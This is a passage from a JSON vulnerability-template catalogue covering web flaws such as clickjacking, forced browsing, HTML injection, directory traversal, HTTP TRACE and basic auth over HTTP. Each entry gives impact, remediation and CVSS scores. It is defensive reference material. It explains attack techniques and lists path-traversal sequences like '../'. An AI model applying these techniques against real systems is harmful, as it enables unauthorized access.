client-side.\n","cvss_base_score":2.1,"cvss_temporal_score":1.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N/E:U/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":768,"plugin_id":null,"title":"Sensitive Transactions Performed via GET Request","type":null,"description":"The application allows the user to perform sensitive transactions via GET request. Traditionally, applications utilize the GET method to retrieve data from a specific resource, while the POST method is used to submit data for processing by a specific resource. Since this is only a guideline, applications can be written that perform transactions via GET request or return information via POST request. There are valid reasons to use the POST method when retrieving data from the server, primarily when large amounts of data need to be submitted to the server as part of the request to retrieve content. Submitting requests for information in this manner does not present inherent security risks. Performing transactions via GET request, however, may allow an attacker to perform certain types of attacks against users and the application.\n","poc":null,"impact":"Transactions performed via GET request may expose sensitive information as well as allow attackers to more easily execute cross-site request forgery attacks.\nMany functions an application may perform require user-supplied information to execute. When such functions are performed via GET requests, the information must be passed via query string. Since the query string is sent as part of the URL, this information may be exposed anywhere the URL is viewed or stored (e.g. browser history, proxy logs, web server logs, etc.).\nIn addition to information leakage, transactions performed via GET request may provide an attacker the ability to more easily execute cross-site request forgery attacks. Specifically, an attacker could exploit this behavior by tricking a legitimate user into navigating to a URL containing query string parameter values of the attacker's choosing. By navigating to this modified URL, a legitimate user inadvertently makes a request containing values supplied by the attacker, allowing the attacker to effectively perform an action as the authenticated user.\nThe attacker could coerce a legitimate user into navigating to the modified URL in a number of ways:\n--The attacker could exploit an unrelated cross-site scripting vulnerability to embed HTML, which automatically loads the modified URL when a legitimate user navigates to the compromised page.\n--The attacker could send phishing emails to legitimate users containing the modified link, in the hope that some would follow the link. Anyone who loads the link would perform the transaction using the values the attacker supplied in the URL.\n\n","remediation":"The application should only perform actions via POST requests.\nIn addition, cross-site forgery protection should be implemented to prevent attackers from executing similar attacks via POST requests. Preventing a cross-site request forgery vulnerability requires adding a non-predictable parameter to requests that performs any transaction that modifies the application's data or internal state. This parameter must be part of the form and not stored in the cookie. The easiest way to add a non-predictable parameter is to use a secure hash function, such as SHA-2, to hash the user's session ID. This parameter is referred to as a \"form-authenticator\" because this parameter is checked on the server to ensure that this is a legitimate request from the application. The application includes the form-authenticator when a legitimate page is generated (e.g., as a hidden field). When the form is then submitted, the application verifies that the form-authenticator provided from the form matches the one issued when the page was generated. If they match, the request can be processed; otherwise, the application issues an error indicating the request is invalid.\n","cvss_base_score":5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":769,"plugin_id":null,"title":"Resources Accessible Through Forced Browsing","type":null,"description":"The application fails to properly restrict access to a URL or resource, exposing the application to forced browsing attacks. In this design, users are able to navigate directly to unauthorized resources as long as they know the resource's path and name. Forced browsing often takes place when an application enforces user entitlements by displaying only links the user is entitled to access. For example, the home page for a non-admin user would not include a link to an admin page. However, without entitlement checks on the admin page itself, a user with knowledge of the admin URL would be able to navigate directly to the admin page and access its data and functionality.\nForced browsing can also occur when an application uses a predictable identifier when serving resources. For example, an application may serve files based on a numeric resource identifier. Due to the predictable nature of the identifier, it may be possible to enumerate over all possible values and obtain unauthorized access to all resources.\n","poc":null,"impact":"--Sensitive data may be exposed when an attacker is able to view other users protected data (e.g. financial statements, health records, or communications, depending on the application's purpose).\n--An attacker may elevate their privileges by forcefully browsing to application pages they are not authorized to view or interact with. For example, the attacker would effectively gain administrative rights by forcefully browsing to administrative pages and executing functionality. In other cases, the attacker may gain access to non-admin functionality they were not granted access to (e.g. starting with a read-only account and forcefully browsing to an edit page to modify content they were only authorized to view).\n--User and application data may be exposed if left in the web root without proper permissions set. An attacker can access this data as long as they can guess the resource name.\n\n","remediation":"The application should perform authentication and authorization checks when any resource is requested. User access should be enforced on a per-page basis, rather than modifying which links appear in the UI. Furthermore, client-side identifiers should not be the sole control when deciding if access should be granted to a resource. When used as an additional control to server side authorization checks, identifiers for resources a user can access should be stored as an array server-side with the index passed back to the user. In this case, although the user can modify the index, they cannot directly change what resource identifiers they are allowed to access.\n","cvss_base_score":7.8,"cvss_temporal_score":6.1,"cvss_vector":"(AV:N/AC:L/Au:N/C:C/I:N/A:N/E:POC/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":770,"plugin_id":null,"title":"End of Life Software","type":null,"description":"The software currently in use is near or has reached its \"end of life\". Software categorized as \"end of life\" has reached the end of its useful life from a manufacturer's standpoint. Software that is marked \"end of life\" will no longer be sold or supported by the manufacturer. From a software security standpoint, this implies that any new or known but previously unfixed vulnerabilities or bugs found in the software will not be fixed by the manufacturer. All vulnerabilities contained in the software will persist indefinitely as if they were zero-day attack vectors.\n","poc":null,"impact":"Continued use of software that has reached its end of life may pose a greater risk to sensitive information as the use of this software provides a wider attack surface for malicious users. Attackers may be able to develop exploit code that is able to take advantage of the vulnerabilities located in the software, providing them access for as long as the software is installed. Organizations may also be subject to legal and compliance violations as a result of using \"end of life\" software.\nFor example, Windows XP reached the end of its life in April 2014. Since Microsoft will not issue security patches for any vulnerability found in XP after April 2014, XP will essentially contain zero-day vulnerabilities forever. Depending on the nature of the vulnerability, this may jeopardize users and organizations that still use XP.\n","remediation":"Users and organizations alike should upgrade their software to the most up-to-date stable version prior to their current software reaching the end of its support life by the developer. If a piece of software has passed its end of life, the user or organization should implement an immediate plan to phase out that particular software in favor of software that is currently maintained.\nOrganizations should also use a patch management system to keep software up to date without disrupting business as usual. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":5.8,"cvss_temporal_score":5,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:P/E:ND/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":771,"plugin_id":null,"title":"Clickjacking","type":null,"description":"The application is vulnerable to clickjacking, which occurs when the application fails to ensure it is the top-level page being rendered in a web browser. Clickjacking occurs when a malicious website presents a page containing an iframe that incorporates legitimate content beneath an invisible malicious page. Commonly, an attacker will utilize social engineering tactics to get a user to voluntarily interact with malicious content on the attacker-controlled page. The attacker-controlled page contains UI elements aligned in such a way that when the user thinks they are clicking on a UI element in the framed page, they are actually clicking on the invisible malicious element floating above it. By disguising the malicious content and making it appear legitimate, the attacker can make it difficult for a user to differentiate between malicious and harmless content. By employing this technique the victim's click has been \"hijacked\".\n","poc":null,"impact":"Clickjacking is used to trick a user into thinking they are clicking on a UI element on a visible page, when the click is actually captured by an entirely different element on an invisible layer. This results in the victim unintentionally carrying out an action on behalf of the attacker. Examples include allowing access to the client computer's hardware features (e.g., enabling the webcam) or submitting a form to initiate an unintended transaction (such as one-click online shopping, \"liking\" a Facebook page, initiating a money transfer, etc.).\nReal-world examples of clickjacking include exploits on embedded Twitter \"Follow\" buttons and Facebook \"Like\" buttons. In these attacks, the malicious website contains valid \"Follow\" or \"Like\" buttons, renders them transparent, and adds a decoy element underneath the button. The user believes they are clicking on the visible element, while their click is actually performing a \"like\" or \"follow\" action on Facebook or Twitter, respectively.\n","remediation":"A combination of frame-busting JavaScript code and the X-FRAME-OPTIONS and Content-Security-Policy headers provide adequate protection against clickjacking. Frame-busting JavaScript provides significant protection against non-expert attackers; it uses CSS to show the web page only if the top object is equal to self (i.e. the page is not being loaded into a frame).\n<pre><style>   html { display:none; } </style> <script>   if (self == top) {     document.documentElement.style.display = 'block';   } else {     top.location = self.location;   } </script> </pre>\nIn addition to frame-busting code, two HTTP headers should be employed to protect against clickjacking. The X-FRAME-OPTIONS header supports two options that help protect against clickjacking. The \"DENY\" option prevents supporting browsers from rendering the page if it resides inside any iframe. The \"SAMEORIGIN\" option prevents browsers from rendering the page in an iframe on all pages hosted outside the framed page's domain.\nThe Content-Security-Policy header, which specifies whitelists of trusted content that the browser may load along with page content, can be set to prevent a page from being framed using the \"frame-ancestors\" option:\n<pre>Content-Security-Policy: frame-ancestors 'none' </pre>\nThese headers are supported to varying degrees by modern browsers, and should be employed along with frame-busting code to provide protection across as many browsers and browser versions as possible.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":772,"plugin_id":null,"title":"Html Injection","type":null,"description":"An HTML injection vulnerability occurs when a web application sends strings that were provided by an attacker to a victim's browser in such a way that the browser renders part of the string as HTML markup. The string contains malicious data and is passed as-is to the application through a parameter that an attacker can control (e.g. a URL parameter or an HTML form field). The application immediately inserts it into its response. This results in the victim's browser rendering the attacker-controlled HTML markup.\n","poc":null,"impact":"An HTML injection vulnerability allows an attacker to inject malicious HTML content into application pages displayed to the victim. This HTML may have any number of unintended consequences depending on the syntax that can be injected. The following are some examples of ways HTML injection may impact the application and the business at large:\n--Damage to brand through site defacement\n--Information leakage through injected page content that spoofs legitimate application functionality (e.g. a form that asks the user to reenter their credentials and then sends the credentials to the attacker)\n--Page redirect to an attacker-controlled site via the meta refresh tag\n\n","remediation":"HTML injection is prevented by encoding data before inserting it into the generated web page. Each character of the data is encoded and the result string is then inserted into the generated web page. This technique of encoding values before inserting them in the web page is called \"output encoding\". Output encoding libraries exist for most popular programming languages and frameworks. A web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded using the proper scheme. The seven different encoding schemes are:\n--HTML Text Element\n--HTML Attribute\n--URL Parameter\n--JavaScript Literal\n--HTML Comment\n--HTTP Header\n--CSS Property\n\nLibraries for implementing the encoding schemes exist for most popular programming languages.\n--OWASP Java Encoder: Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery: for preventing DOM-based XSS\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper encoding\n\n","cvss_base_score":4,"cvss_temporal_score":3.5,"cvss_vector":"(AV:N/AC:L/Au:S/C:N/I:P/A:N/E:H/RL:OF/RC:C/CDP:LM)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":773,"plugin_id":null,"title":"Unrestrictive Cross-Domain Policy File","type":null,"description":"The crossdomain.xml file is a policy file that defines whether a web application's resources can be accessed from flash applications on different domains. When a web site has an overly permissive crossdomain.xml policy (e.g. when the crossdomain.xml file is configured to allow flash files from any domain to access that site's resources), a malicious third-party flash application may be able to make requests to the website. If a cross-site request forgery (CSRF) or cross-site tracing (XST) vulnerability also exists on the website, an attacker would be able to exploit these vulnerabilities using the malicious flash application.\n","poc":null,"impact":"\n","remediation":"Set the domain attribute of the allow-access-from entity in the crossdomain.xml file to include specific domain names instead of a wild card to specify any domain. For example:\n<pre><code class=\"xml\"><?xml version=\"1.0\"?> <cross-domain-policy>     <allow-access-from domain=\"www.company.com\" />     <allow-access-from domain=\"*.intranet.company.com\" /> </cross-domain-policy> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:N/A:N/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":774,"plugin_id":null,"title":"Horizontal Privilege Escalation","type":null,"description":"The application lacks sufficient controls to prevent a user from accessing data or functionality that would not normally be accessible to them, but would be accessible to other users of the same role. For example, a user may be expected in the normal course of their work to perform transactions or view data for Company A, but the expectation is that there should be controls in place to prevent them from having the same access to Company B's data and functionality. A user is able to elevate their privileges horizontally when the controls in place to prevent this access are not present or they do not function properly, allowing the user to access data or perform actions related to Company B.\n","poc":null,"impact":"When a horizontal privilege escalation attack yields read-only access outside a user's authorization boundary, sensitive information available only to other users' accounts may be leaked. An attacker able to execute functionality that acts on unauthorized user assets may have any number of consequences including, but not limited to:\n--Financial loss (e.g. via funds transfer to and from unauthorized accounts)\n--Loss of data integrity via unauthorized creation, modification or destruction of data\n\n","remediation":"Authorization should always be explicitly checked server-side to verify that the user making a request to view data or perform an action is authorized to do so.\nThis may be as simple as checking that a user is authorized to view a particular page in the application or check that the user is authorized to perform an action overall. Many other more fine-grained situations may exist depending on the application context and the complexity of the business functionality. The following are some common situations where a more fine-grained authorization check is necessary:\n--A user may be authorized to perform an action, but only against certain entities involved in the transaction. For example, a user may be authorized to perform a funds transfer from one account to another, but they may only be authorized to access certain accounts. Authorization checks must be performed to verify that the user is authorized to make a funds transfer as well as verify that the user is authorized to perform that transaction using the supplied accounts.\n--A user may be authorized to only view data tied to their own account. For example, a retail banking customer may be authorized to view the details of each of their accounts at a particular bank, but may not be authorized to view the details of other users' accounts. Authorization checks must be performed to verify that the user is authorized to view account details as well as verify that the user is authorized to view the details of the account they have requested information for.\n\n","cvss_base_score":6.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":775,"plugin_id":null,"title":"No Logout Functionality","type":null,"description":"The application does not provide logout functionality. Applications traditionally provide functionality on each page which, when executed, destroys the user's server-side session and redirects them to the application login page. This helps prevent unauthorized access to a user's account by limiting the amount of time the user's session is active, and also provides legitimate users with a way to end their session in the event of session compromise.\n","poc":null,"impact":"With no way for users to terminate their session, the associated session identifier will continue to provide access to the user's data and functionality until a server-side timeout occurs. As a result, an attacker has a larger window of time in which to obtain the victim's session identifier and use it to impersonate that user. A stolen identifier may also be used indefinitely if the attacker makes periodic calls to the server to keep the identifier alive. Furthermore, if a user discovers that their account has been compromised due to a stolen session identifier, they have no means of logging out of the application and ending their active session to deny the malicious user access to their session.\n","remediation":"A logout button must be provided on each page of the application which, when clicked, executes functionality that terminates the user's session on the server.\n","cvss_base_score":5.2,"cvss_temporal_score":4.3,"cvss_vector":"(AV:L/AC:L/Au:S/C:C/I:P/A:N/E:F/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:22","updated_at":"2018-11-12 09:25:22","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":776,"plugin_id":null,"title":"Query String Parameter in HTTPS Request","type":null,"description":"Sensitive information is exposed in transit between the client and the server via URL query string parameters. URLs may be stored or viewed in multiple places during and after a request is made to the server:\n--If the URL is requested by clicking a link or manually entering the address, the query string can be seen in the browser address bar\n--URLs are often logged in multiple places including the browser history, proxy logs, and web server logs\n--The query string will be sent as part of the URL if the URL is passed to another site via the Referer header\n--URLs sent to the user as part of an HTML page may be cached on disk\n\n","poc":null,"impact":"An attacker who gains access to any location where URLs are stored will be able to view sensitive information passed via the query string. Depending on the nature of the information, a malicious user may obtain personally identifiable information (PII), private user data or information which would allow user impersonation (in the event of credential or session identifier exposure). Potential access vectors may include but are not limited to:\n--Browser history, proxy logs, web server logs, etc.\n--Utilizing other attacks (such as cross-site scripting) to extract sensitive information from the source of a page containing links to URLs with sensitive information in the query string\n--Shoulder-surfing the URL in a user's browser address bar\n\n","remediation":"Sensitive information should be passed between the client and server via POST parameters and not in any portion of the URL.\n","cvss_base_score":4.3,"cvss_temporal_score":3.2,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":777,"plugin_id":null,"title":"Autocomplete HTML Attribute Not Disabled for Sensitive Fields","type":null,"description":"The HTML autocomplete attribute is not set as disabled for sensitive fields. When autocomplete is enabled for a given HTML form field, the browser attempts to fill in a previously stored value as the user enters information. Unique values entered into these fields are cached by the browser for later use.\n","poc":null,"impact":"An attacker can retrieve data cached through the browser's autocomplete mechanism via local access to the browser or remote scripting attack. Any sensitive information stored in the browser's autocomplete cache would be exposed. The consequence of exposure differs depending on the type of data cached. An attacker can use exposed passwords to impersonate victims in the application, or use a victim's PII (such as social security number, account information, etc.) to steal the victim's identity or gain unauthorized access to their accounts.\n","remediation":"Disable autocomplete for sensitive information, including, but not limited to, passwords and personally identifiable information. To disable autocomplete on an individual input field, set the autocomplete attribute to \"off\":\n<pre><input type=\"text\" name=\"sensitive_input\" value=\"sensitive_value\" autocomplete=\"off\" /> </pre>\nTo disable autocomplete on an entire form, set the attribute on the form instead of on individual fields:\n<pre><form name=\"sensitive_data_form\" autocomplete=\"off\"> </pre>\n","cvss_base_score":4.4,"cvss_temporal_score":3.6,"cvss_vector":"(AV:L/AC:M/Au:S/C:C/I:N/A:N/E:F/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":778,"plugin_id":null,"title":"Directory Traversal","type":null,"description":"Directory traversal occurs when an attacker obtains unauthorized access to the contents of a directory or file on the server by exploiting how the server dynamically generates paths to those resources. There are traditionally two ways to refer to resources on a file system:\n--The absolute path to the resource\n--An abstract path which contains control characters that alter the path through directory change (including, but not limited to, ../,..\\, /,\\, and ~/)\n\n","poc":null,"impact":"Directory traversal results in an attacker gaining unauthorized access to the file system by manipulating input used by the application to construct a pathname.\n","remediation":"To protect against directory traversal the application should enforce strict access controls and validate user input used to create pathnames or create indirect object references for file access. The application should configure access to the file system on a least privilege basis. In addition, the application whenever possible must restrict the use of paths by validating user input.  When paths are required for the application to function properly, indirect object references should be used for file access instead of accepting paths from the user. For example, consider an application that allows its users to specify a file to download from a directory. Instead of using a user-supplied filename to access the file, the application should maintain a mapping from integer keys to file names, ensuring that the supplied value is both an integer and corresponds to an actual file. In the case that a value does not have a corresponding file, the application should return a generic error message. This will provide whitelist validation for the files that exist in the application.\n","cvss_base_score":5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":779,"plugin_id":null,"title":"Unmasked PII Data","type":null,"description":"Personally identifiable information (PII) is displayed in clear text to the end user. PII can refer to any data that is considered sensitive in nature. PII can be used to identify individual users and to distinguish users from one another, depending on the exact data available. The following are examples of PII:\n--Driver's license number\n--Date of birth\n\n--Birthplace\n--Maiden name, mother's maiden name, or alias\n--Username\n--Educational records\n--Employment information\n\n","poc":null,"impact":"Including unmasked PII data in application responses may result in the exposure of sensitive information and a loss of confidentiality. PII data included in application responses may be exposed in several ways:\n--Shoulder-surfing or other unauthorized access to the client's system while the victim is logged in\n--Cached responses on the client's system or on systems that route traffic between the client and server\n--Network-based man-in-the-middle attacks\n\n","remediation":"Personally identifiable information (PII) should be masked or obfuscated in all application input fields and when it is displayed back to the user. PII should be masked server side before being sent to the client to be displayed. This will ensure that an end user cannot view the un-masked data (e.g. via HTML source), as well as prevent the data from being intercepted in transit to the client. For example, when the application wants to display a user's driver's license number, the server should mask the number to only show the last four digits while the first digits are represented by a place holder, such as an asterisk. In cases where PII must be displayed as part of legitimate business functionality, it should be sent to the client only when explicitly requested, rather than embedded in one or more pages by default. In addition, this information should only be displayed for one account at a time.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":780,"plugin_id":null,"title":"HTTP TRACE Method Enabled","type":null,"description":"The HTTP TRACE method is enabled on the web server. The HTTP TRACE method instructs the web server to echo the entire contents of the received message back to the calling client, usually for debugging purposes. Consider the following example TRACE request to a web server running on localhost:\n<pre>TRACE / HTTP/1.1 Host: 127.0.0.1 </pre>\nIf TRACE is enabled, the server will respond with a message body consisting of the initial request's HTTP headers and message body:\n<pre>HTTP/1.1 200 OK Date: Sat, 11 May 2013 14:46:59 GMT Server: Apache/2.2.3 (Red Hat) Connection: close Transfer-Encoding: chunked Content-Type: message/http  TRACE / HTTP/1.1 Host: 127.0.0.1 </pre>\n","poc":null,"impact":"The TRACE HTTP method can be used in conjunction with other vulnerabilities (such as cross-site scripting) to return the entire contents of an HTTP request message (including HTTP headers) to an attacker. Since the server echoes both the request body and HTTP headers, an attacker able to obtain the response to the TRACE request would gain access to sensitive information passed via HTTP headers, including session identifiers passed via cookies. The attacker could then use this information to impersonate the victim in the application.\n","remediation":"Disable the HTTP TRACE method if not required for the web server to function properly.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":781,"plugin_id":null,"title":"Password Reset Username Enumeration","type":null,"description":"The application's password reset functionality returns different responses depending on whether the entered username is valid or not. The difference in responses may be as straightforward as \"An email with password reset instructions was sent to the user's email address on file\" versus \"User [username] does not exist\". Responses may also be more subtle. For example the application may return a generic password reset success message that differs slightly depending on whether a valid or invalid username is supplied, or the application may display a single message, but some other (potentially non-visible) aspect of the response's content is different.\nAn attacker can abuse this design to compile a list of valid users through automated brute force guessing attempts. Simple scripts can be found or written that automatically guess usernames by submitting them to the login function with a dummy password and observing the server's responses.\n","poc":null,"impact":"Username enumeration provides an attacker with one of two pieces of information required to authenticate to the application. By automating guesses, an attacker is able to retrieve a large list of valid usernames for an application. Once the attacker has a list of valid usernames, they can begin guessing passwords in an attempt to steal credentials and impersonate other users. Password guessing attempts may be done manually, or via automated means depending on what login anti-automation mechanisms (if any) the application has in place. Valid usernames may also be used in phishing exercises as well as large-scale account lockout denial of service attacks.\n","remediation":"The application should return the same response whether or not the supplied username is associated with a valid account, e.g., \"If the supplied username exists, an e-mail has been sent to the e-mail address associated with that username.\" This message must be returned to the user before any server-side password reset logic is performed to prevent users from guessing valid usernames based on the server's response time.\n","cvss_base_score":5.8,"cvss_temporal_score":4.8,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:P/E:F/RL:OF/RC:C/CDP:L/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":782,"plugin_id":null,"title":"Basic Authentication over an Unencrypted Connection","type":null,"description":"Basic authentication is used over an unencrypted connection to authenticate users to the application. This means that an HTTP header containing the base-64 encoded username and password will be included in requests made to the server. Using Basic Authentication over an unencrypted connection allows anyone with access to the requests to obtain and decode these credentials. As an example, this would be possible when the attacker and victim are connected to the same wireless network.\nBelow is an example request which features basic authentication:\n<pre>GET /protected_area/ HTTP/1.1 Host: www.example.com Authorization: Basic ZXhhbXBsZVVzZXJuYW1lOlMzY3VyZVBAc3N3MHJk </pre>\nThe base64 encoded string \"ZXhhbXBsZVVzZXJuYW1lOlMzY3VyZVBAc3N3MHJk\" decodes to the following credentials:\nexampleUsername:S3cureP@ssw0rd\n","poc":null,"impact":"As HTTP Basic Authentication offers no confidentiality, transmission over an unencrypted connection allows an attacker to obtain the victim's credentials as they're transmitted over the network. As a result, the attacker can masquerade as the victim and/or obtain an escalated level of privilege. As the plaintext credentials are obtainable, it may also be possible for an attacker to re-use them to authenticate with other systems.\n","remediation":"Credentials should be protected when communicated over the network. Enabling and enforcing SSL will protect all communications, including transmitting of credentials. If SSL is not an option, NTLMv2 and Digest-MD5 are authentication mechanisms suitable for non-SSL connections. Be aware, however, that non-SSL connections are inherently insecure.\n","cvss_base_score":6.1,"cvss_temporal_score":5.1,"cvss_vector":"(AV:N/AC:H/Au:S/C:C/I:P/A:P/E:F/RL:OF/RC:C/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"High","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":783,"plugin_id":null,"title":"Mail Injection","type":null,"description":"The application constructs an email containing untrusted user-supplied data in such a way that it is interpreted as HTML code and rendered in the recipient's mail client. The malicious data is passed to the application as a parameter and the application inserts it directly into the body of the email. When no input validation is performed, any HTML tags included in user input will be interpreted as part of the email body.\n","poc":null,"impact":"Mail Injection allows an attacker to inject malicious content into application-generated emails. Injected content can be used to compromise the recipient's identity or trick them into performing unintended operations since the attacker can abuse a user's trust in the email. For example, malicious links placed in the email's body may direct the user to fraudulent phishing sites. Injected links can also be used to exploit other vulnerabilities in legitimate sites (e.g. cross-site scripting, cross-site request forgery, etc.). Additionally, if the application allows the attacker to control more parameters than just the body, it is possible to spoof the source email address, compromising the integrity of the email.\n","remediation":"The application should perform input validation and output encoding on user input that propagates to an application-generated e-mail. Validation should also be performed on all email-specific fields, such as the \"To\", \"From\", and \"Message\" fields of the e-mail API that the application presents to the user.\nFurthermore, HTML that is identified in the message body can be handled in one of two ways depending on the application's required functionality. HTML can be completely blocked from the body by triggering an error message when HTML is encountered, or the HTML can be encoded and remain as part of the message. Note that any encoding or removal of HTML characters must be performed on plaintext e-mails as well, since email clients may still render HTML found in plaintext emails.\n","cvss_base_score":4.9,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:P/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":784,"plugin_id":null,"title":"Weak Hash Function","type":null,"description":"The application uses a weak cryptographic hashing function. A weak cryptographic hashing function is one that does not meet the following requirements:\n--Pre-image resistance: it is infeasible to generate a message that has a given hash\n--Collision resistance: it is infeasible to find two different messages with the same hash\n--Second pre-image resistance: it is infeasible to modify a message without change the hash\n\nAlternately, the application may be using a non-cryptographic hashing function in place of a cryptographic hashing function. An example of this would be the use of Cyclic Redundancy Checks (CRC).\n","poc":null,"impact":"Use of weak hashing functions may provide an attacker with the ability to recover the plaintext that was used to create the hash. The plaintext may contain sensitive data such as passwords or personally identifiable information. Additionally, weak hashing functions vulnerable to collision attacks can be abused to generate an identical hash expected by the server/application without knowledge of the original plaintext. A collision attack could aid an attacker in:\n--Bypassing a digital signing mechanism used by the server/application.\n--Bypassing authentication without knowledge of the original password.\n\n","remediation":"Ensure the use of cryptographically strong hashing algorithms such the ones approved by 